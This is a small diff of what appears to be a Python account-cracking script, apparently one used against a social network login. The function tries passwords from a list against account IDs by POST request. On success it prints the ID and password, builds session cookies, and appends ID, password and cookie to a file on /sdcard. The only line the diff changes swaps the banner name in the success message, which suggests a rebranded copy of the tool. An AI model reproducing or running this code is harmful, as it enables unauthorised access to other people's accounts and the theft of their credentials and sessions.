@@ -185,7 +185,7 @@ def ___M1___(ids,names,passlist):
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
                                         cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}ASRAFUL-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}AINSLEY-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
                                         print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
                                         open('/sdcard/ASRAFUL-FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                         oks.append(ids)
